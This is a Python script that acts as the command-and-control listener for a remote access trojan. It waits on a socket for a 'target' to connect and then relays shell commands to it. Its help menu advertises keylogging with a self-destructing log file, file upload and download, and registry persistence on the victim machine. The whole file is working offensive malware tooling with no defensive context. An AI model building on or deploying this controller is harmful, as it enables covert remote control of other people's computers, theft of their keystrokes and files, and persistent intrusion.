import socket
import termcolor
import json
import os


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                    --> Quit session with target
            clear                                   --> Clear the screen
            cd *Directory name*                     --> Change Directory on target system
            upload *file name*                      --> Upload file to target machine
            download *file name*                    --> Download file from target machine
            keylog_start                            --> Start the keylogger
            keylog_dump                             --> Print keystrokes that target has input
            keylog_stop                             --> Stop and self destruct keylogger file
            persistence *RegName* *fileName*        --> Create persistence in registry''', 'green'))
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(termcolor.colored('[+] Listening for incoming connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target connected from: ' + str(ip), 'green'))
target_communication()
